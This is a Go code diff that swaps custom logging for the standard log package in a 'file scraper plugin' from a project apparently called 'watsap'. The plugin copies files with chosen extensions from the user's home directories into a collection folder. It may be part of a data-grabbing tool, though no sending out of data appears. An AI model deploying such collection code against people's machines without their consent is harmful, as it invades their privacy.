@@ -1,7 +1,7 @@
 package files
 
 import (
-	"fmt"
+	"log"
 	"os"
 	"path/filepath"
 	"watsap/utils/config"
@@ -21,7 +21,7 @@ func getSourceDirectories() []string {
 		baseDir = os.Getenv("HOME")
 	}
 	if baseDir == "" {
-		config.Logger("[File] Error: HOME or USERPROFILE environment variable not set", "error")
+		log.Println("ERROR: HOME or USERPROFILE environment variable not set")
 		return nil
 	}
 	dirs := []string{
@@ -34,10 +34,10 @@ func getSourceDirectories() []string {
 }
 
 func InitFiles() {
-	config.Logger("[File] Starting file scraper plugin", "default")
-	config.Logger("[File] srcDirs: "+fmt.Sprintf("%v", getSourceDirectories()), "default")
-	config.Logger("[File] dstDir: "+config.FilesDir, "default")
-	config.Logger("[File] extensions: "+fmt.Sprintf("%v", extensions), "default")
+	log.Println("[File] Starting file scraper plugin")
+	log.Printf("[File] srcDirs: %v", getSourceDirectories())
+	log.Printf("[File] dstDir: %s", config.FilesDir)
+	log.Printf("[File] extensions: %v", extensions)
 
 	srcDirs := getSourceDirectories()
 	if srcDirs == nil {
@@ -45,6 +45,6 @@ func InitFiles() {
 	}
 	dstDir := config.FilesDir
 	if err := copyFilesWithExtensions(srcDirs, dstDir, extensions); err != nil {
-		config.Logger(fmt.Sprintf("[File] Error copying files: %v", err), "error")
+		log.Printf("ERROR: [File] Error copying files: %v", err)
 	}
 }
